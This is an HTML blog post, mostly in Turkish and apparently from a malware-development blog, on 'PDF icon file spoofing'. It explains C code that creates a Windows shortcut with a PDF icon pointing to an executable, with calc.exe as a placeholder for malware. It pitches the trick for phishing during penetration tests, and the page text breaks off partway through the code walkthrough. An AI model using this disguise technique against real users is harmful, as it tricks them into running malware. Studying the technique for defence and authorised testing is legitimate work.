@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">PDF Icon File Spoofing | bekoo&#39;s blog</title>
+<meta property="og:title" content="PDF Icon File Spoofing | bekoo&#39;s blog" />
+<meta name="twitter:title" content="PDF Icon File Spoofing | bekoo&#39;s blog" />
+<meta itemprop="name" content="PDF Icon File Spoofing | bekoo&#39;s blog" />
+<meta name="application-name" content="PDF Icon File Spoofing | bekoo&#39;s blog" />
+<meta property="og:site_name" content="bekoo&#39;s blog" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/en/posts/file-icon-spoofing/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.130.0">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/en/posts/file-icon-spoofing/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0xbekoo.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">PDF Icon File Spoofing</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-07-31T00:00:00&#43;00:00" itemprop="datePublished"> 31 Jul 2024 </time>
+                </div>
+                
+            </header>
+            
+    
+        
+            
+        
+    
+    <details class="toc" open>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#code">Code</a></li>
+    <li><a href="#programı-çalıştırma">Programı Çalıştırma</a></li>
+    <li><a href="#sonuç">Sonuç</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <p>Merhabalar. Bu konumda icon file spoofing tekniğinden bahsedeceğim.</p>
+<p>Kısaca tekniği özetlemek gerekirse oluşturulan malware&rsquo;in programın icon&rsquo;u değiştirilerek kullanıcıyı yanıltma tekniğidir. Bu sayede kullanıcı, ilgili malware&rsquo;i zararsız bir dosya olarak görebilir. Malware için belirlediğiniz icon, bu konuda örnek olarak gösterileceği gibi bir PDF olabilir veya bir başka icon olabilir. Tekniğin, sosyal mühendislik saldırıları için oldukça etkili bir yöntem olabilir ve ayrıca Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.</p>
+<p>Konunun daha iyi anlaşılması için örnek senaryo üzerinden ilerleyelim, bir şirketin iç ağının güvenliğini test etmek amacıyla görevlendirilmiş bir pentester olduğunuzu düşünün. Şirket çalışanlarının kötü amaçlı dosyaları açma konusunda ne kadar dikkatli olduklarını test etmeniz gerekiyor. Bu bağlamda, kötü amaçlı yazılımınızı zararsız bir PDF dosyası olarak maskeleyerek, bir kimlik avı e-postası aracılığıyla veya paylaşılan bir klasöre yerleştirerek gönderebilirsiniz. Eğer bir çalışan bu dosyayı açarsa, dosya aslında zararlı yazılımı çalıştırarak sistemlerine erişim sağlar.</p>
+<h2 id="code">Code</h2>
+<blockquote>
+<p>EN <br>
+The code I shared here is taken from S12 H4CK&rsquo;s PDF Icon File Spoofing topic, which I used for this topic, and slightly updated by myself. You can check the References for more details.</p>
+</blockquote>
+<blockquote>
+<p>TR <br>
+Bu konu için kullandığım kod parçası, S12 H4CK&rsquo;in PDF Icon File Spoofing konusundan alınmış ve tarafımca güncellenmiştir. Daha fazla detay için Referanslar kısmından makalesine göz atabilirsiniz.</p>
+</blockquote>
+<p>Hazırlanan örnek kod parçasının github link&rsquo;ine erişmek için <a href="https://github.com/0xbekoo/maldev/tree/main/C/File-Icon-Spoofing">buraya</a> tıklayabilirsiniz.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;strsafe.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;wchar.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;ShlObj.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;objbase.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">CreateShortcut</span><span class="p">(</span><span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">TargetPath</span><span class="p">,</span> <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">ShortcutPath</span><span class="p">,</span> <span class="k">const</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">IconPath</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HRESULT</span>         <span class="n">HRES</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">IShellLink</span><span class="o">*</span>     <span class="n">PSL</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IPersistFile</span><span class="o">*</span>   <span class="n">PPF</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">CoInitialize</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">HRES</span> <span class="o">=</span> <span class="nf">CoCreateInstance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">CLSID_ShellLink</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">IID_IShellLink</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PSL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">FAILED</span><span class="p">(</span><span class="n">HRES</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to create IShellLink Object! Error Code:  0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HRES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">SetPath</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="n">TargetPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">SetIconLocation</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="n">IconPath</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">SetDescription</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;Very important file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">HRES</span> <span class="o">=</span> <span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">QueryInterface</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">IID_IPersistFile</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PPF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">FAILED</span><span class="p">(</span><span class="n">HRES</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to interface! Error Code: 0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HRES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HRES</span> <span class="o">=</span> <span class="n">PPF</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">Save</span><span class="p">(</span><span class="n">PPF</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PPF</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">Release</span><span class="p">(</span><span class="n">PPF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">Release</span><span class="p">(</span><span class="n">PSL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CoUninitialize</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Shortcut Created!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">wchar_t</span> <span class="n">TargetPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span>    <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">calc.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">wchar_t</span> <span class="n">IconPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span>      <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">path</span><span class="se">\\</span><span class="s">to</span><span class="se">\\</span><span class="s">pdficon.ico&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">wchar_t</span> <span class="n">ShortcutPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HRESULT</span> <span class="n">HRFolder</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">HRFolder</span> <span class="o">=</span> <span class="nf">SHGetFolderPath</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">CSIDL_DESKTOPDIRECTORY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">FAILED</span><span class="p">(</span><span class="n">HRFolder</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to get Desktop Path! Error Code: 0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HRFolder</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">StringCchCatW</span><span class="p">(</span><span class="n">ShortcutPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Projects.lnk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Merged Path: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">CreateShortcut</span><span class="p">(</span><span class="n">TargetPath</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">,</span> <span class="n">IconPath</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to create Shortcut!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Kodlara detaylıca göz atalım ve main içerisinden başlayalım:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">wchar_t</span> <span class="n">TargetPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span>    <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">calc.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">wchar_t</span> <span class="n">IconPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span>      <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">path</span><span class="se">\\</span><span class="s">to</span><span class="se">\\</span><span class="s">pdficon.ico&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">wchar_t</span> <span class="n">ShortcutPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+</span></span></code></pre></div><ul>
+<li><strong>TargetPath:</strong> Bu değişken, oluşturulacak kısayolun hedef dosyasının yolunu belirtir. Bu değişken bizim malware&rsquo;in yolunu belirtir.</li>
+<li><strong>IconPath:</strong> Bu değişken, oluşturulacak kısayolun icon&rsquo;unun yolunu belirtir.</li>
+<li><strong>ShortcutPath:</strong> Bu değişken, oluşturulacak kısayolun yolunu belirtir. <br/> <br/></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HRFolder</span> <span class="o">=</span> <span class="nf">SHGetFolderPath</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">CSIDL_DESKTOPDIRECTORY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">FAILED</span><span class="p">(</span><span class="n">HRFolder</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to get Desktop Path! Error Code: 0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HRFolder</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">StringCchCatW</span><span class="p">(</span><span class="n">ShortcutPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Projects.lnk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Merged Path: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">);</span>
+</span></span></code></pre></div><p>Bu kısımda ise ilk olarak <strong>SHGetFolderPath</strong> fonksiyonu ile desktop dizinin tam yolunu alıyoruz. Ardından alınan dizin yoluna ise StringCchCatW aracılığıyla oluşturulacak kısayol ismi ile birleştiriyoruz. Bu sayede oluşturulacak kısayol&rsquo;un tam yolunu elde etmiş oluyoruz.</p>
+<p>Bu kısayol ismini <strong>Projects.lnk</strong> olarak ayarladım. Siz dilerseniz bunu değiştirebilirsiniz. <br/> <br/></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">CreateShortcut</span><span class="p">(</span><span class="n">TargetPath</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">,</span> <span class="n">IconPath</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to create Shortcut!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Bu kısımda ise oluşturduğumuz CreateShortcut fonksiyonunu çağırıyoruz ve if ile bir karşılaştırma yapıyoruz. Eğer CreateShortcut fonksiyonu 0&rsquo;dan yüksek yani 1 değerini döndürürse hata mesajı ekrana bastırarak -1 ile programı return ettiriyoruz. <br/> <br/></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">CoInitialize</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">HRES</span> <span class="o">=</span> <span class="nf">CoCreateInstance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">CLSID_ShellLink</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">IID_IShellLink</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PSL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">FAILED</span><span class="p">(</span><span class="n">HRES</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to create IShellLink Object! Error Code:  0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HRES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>CreateShortcut fonksiyon içerisinde ise ilk olarak CoInitialize fonksiyonu ile COM bileşenlerini başlatıyoruz. Peki ama neden COM bileşenlerini başlatıyoruz?</p>
+<p>Çünkü IShellLink ve IPersistFile interface&rsquo;leri COM bileşenleridir. Bu interface&rsquo;ler bizim kısayol oluşturmak için kullanacağımız araçlardır. Dolayasıyla bunlara erişmemiz için COM bileşenlerini başlatmamız gerekmektedir.</p>
+<p>Ardından CoCreateInstance fonksiyonu ile IShellLink interface&rsquo;ini oluşturuyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. <br/> <br/></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">SetPath</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="n">TargetPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">SetIconLocation</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="n">IconPath</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">SetDescription</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;Very important file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRES</span> <span class="o">=</span> <span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">QueryInterface</span><span class="p">(</span><span class="n">PSL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">IID_IPersistFile</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">PPF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">FAILED</span><span class="p">(</span><span class="n">HRES</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to interface! Error Code: 0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">HRES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Bu kod bloğunda ise oluşturduğumuz IShellLink interface&rsquo;ine <strong>Target Path</strong>, <strong>Icon Path</strong> ve <strong>Description</strong> ekliyoruz. Bu adımlar, oluşturacağımız kısayolun özelliklerini belirtir.</p>
+<p>Ardından QueryInterface fonksiyonu ile IPersistFile interface&rsquo;ine erişim sağlıyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. <br/> <br/></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HRES</span> <span class="o">=</span> <span class="n">PPF</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">Save</span><span class="p">(</span><span class="n">PPF</span><span class="p">,</span> <span class="n">ShortcutPath</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">PPF</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">Release</span><span class="p">(</span><span class="n">PPF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">PSL</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="nf">Release</span><span class="p">(</span><span class="n">PSL</span><span class="p">);</span>
